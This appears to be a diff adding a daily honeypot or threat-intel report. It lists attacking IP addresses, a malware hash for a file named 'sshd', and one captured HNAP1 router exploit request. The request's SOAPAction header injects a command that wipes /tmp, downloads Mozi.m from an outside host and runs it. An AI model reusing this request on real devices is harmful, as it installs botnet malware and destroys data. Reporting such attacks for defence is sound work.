@@ -1,0 +1,25 @@
+Top 5 IPs for 29-07-2024 :
+
+202.125.139.10
+150.195.132.46
+167.99.140.19
+102.23.254.239
+152.32.134.156
+
+Malware Observed:
+
+File name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+
+
+Commands/exploits observed:
+
+POST /HNAP1/ HTTP/1.0
+Host: <Host IP>
+Content-Type: text/xml; charset="utf-8"
+SOAPAction: http://purenetworks.com/HNAP1/`cd /tmp && rm -rf * && wget http://46.32.172.198:11551/Mozi.m && chmod 777 /tmp/Mozi.m && /tmp/Mozi.m`
+Content-Length: 640
+
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><AddPortMapping xmlns="http://purenetworks.com/HNAP1/"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>
